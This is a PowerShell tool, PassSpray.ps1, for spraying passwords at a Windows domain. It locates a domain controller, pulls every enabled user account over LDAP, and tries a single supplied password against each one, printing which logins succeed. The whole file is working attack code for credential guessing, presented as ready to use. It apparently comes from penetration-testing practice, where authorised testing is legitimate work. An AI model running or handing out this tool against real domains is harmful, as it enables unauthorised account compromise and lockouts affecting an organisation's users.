<#

.SYNOPSIS
PassSpray.ps1 Author: Rob LP (@L3o4j)
https://github.com/Leo4j/PassSpray

.DESCRIPTION
Domain Password Spray

#>

function Invoke-PassSpray {
	Param
    (
		[string]
        $Password,
		[string]
        $Domain,
		[string]
        $DomainController
    )
	
	if(!$Domain){
		$Domain = $env:USERDNSDOMAIN
		if(!$Domain){$Domain = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName.Trim()}
	 	if(!$Domain){$Domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Domain | Format-Table -HideTableHeaders | out-string | ForEach-Object { $_.Trim() }}
	}
	
	if(!$DomainController){
		$currentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)))
		$domainControllers = $currentDomain.DomainControllers
	 	$DomainController = $domainControllers[0].Name
	  	if(!$DomainController){
			$DomainController = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().RidRoleOwner.Name
		}
	  	if(!$DomainController){
			$result = nslookup -type=all "_ldap._tcp.dc._msdcs.$Domain" 2>$null
			$DomainController = ($result | Where-Object { $_ -like '*svr hostname*' } | Select-Object -First 1).Split('=')[-1].Trim()
	  	}
	}
	
	$connection = Establish-LDAPSession -Domain $Domain -DomainController $DomainController

	$AllUsers = @()
	$AllUsers = Get-ADUsers -LdapConnection $connection -ADCompDomain $Domain
	#$AllUsers = ($AllUsers | Out-String) -split "`n"
	#$AllUsers = $AllUsers.Trim()
	#$AllUsers = $AllUsers | Where-Object { $_ -ne "" }
	$AllUsers = $AllUsers | Sort-Object -Unique
	#$AllUsers = $AllUsers | Where-Object { $_ -and $_.trim() }
	#$AllUsers = $AllUsers | Where-Object { $_ -ne "" }
	$AllUsers = $AllUsers | Where-Object { $_ -ne "0" }
	
	$KeepTrack = $False
 	$LDAPPath = "LDAP://"
    	$LDAPPath += $Domain
     	
	foreach($usr in $AllUsers){
		try {
		        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAPPath, $usr, $Password)
		        if ($directoryEntry.name -ne $null) {
		            Write-Output "[+] Authentication Successful for user $usr"
		            $KeepTrack = $True
		        }
		} catch {}
	}
 	if($KeepTrack -eq $False){Write-Output "[-] No Success"}
}

function Get-ADUsers {
    param (
        [string]$ADCompDomain,
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection  # The previously established connection
    )

    # Construct distinguished name for the domain.
    $domainDistinguishedName = "DC=" + ($ADCompDomain -replace "\.", ",DC=")

    # Set up an LDAP search request.
    $ldapFilter = "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $attributesToLoad = @("samAccountName")

    $allusers = @()

    # Create a page request control
    $pageRequest = New-Object System.DirectoryServices.Protocols.PageResultRequestControl(1000)
    
    do {
        $searchRequest = New-Object System.DirectoryServices.Protocols.SearchRequest(
            $domainDistinguishedName,     # Base DN
            $ldapFilter,                  # LDAP filter
            [System.DirectoryServices.Protocols.SearchScope]::Subtree,
            $attributesToLoad             # Attributes to retrieve
        )

        # Add the page request control to the search request.
        $searchRequest.Controls.Add($pageRequest)
        
        # Perform the search using the provided LdapConnection.
        $searchResponse = $LdapConnection.SendRequest($searchRequest)

        # Check for a page response control and update the cookie for the next request.
        $pageResponse = $searchResponse.Controls | Where-Object { $_ -is [System.DirectoryServices.Protocols.PageResultResponseControl] }

        if ($pageResponse) {
            $pageRequest.Cookie = $pageResponse.Cookie
        }

        # Parse the results.
        foreach ($entry in $searchResponse.Entries) {
	    if ($entry.Attributes["samAccountName"] -and $entry.Attributes["samAccountName"].Count -gt 0) {
            	$allusers += $entry.Attributes["samAccountName"][0]
	    }
        }

    } while ($pageRequest.Cookie.Length -ne 0)
	
	foreach($usr in $allusers){
		Write-Output "$usr"
	}
}

function Establish-LDAPSession {
    param (
        [string]$Domain,
        [string]$DomainController
    )

    # If the DomainController parameter is just a name (not FQDN), append the domain to it.
    if ($DomainController -notlike "*.*") {
        $DomainController = "$DomainController.$Domain"
    }

    # Define LDAP parameters
    $ldapServer = $DomainController
    $ldapPort = 389 # Use 636 for LDAPS (SSL)

    # Load necessary assembly
    Add-Type -AssemblyName "System.DirectoryServices.Protocols"

    # Create LDAP directory identifier
    $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($ldapServer, $ldapPort)

    # Establish LDAP connection as current user
    $ldapConnection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)

    # Use Negotiate (Kerberos or NTLM) for authentication
    $ldapConnection.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

    # Bind (establish connection)
    $ldapConnection.Bind()  # Bind as the current user

    return $ldapConnection
}
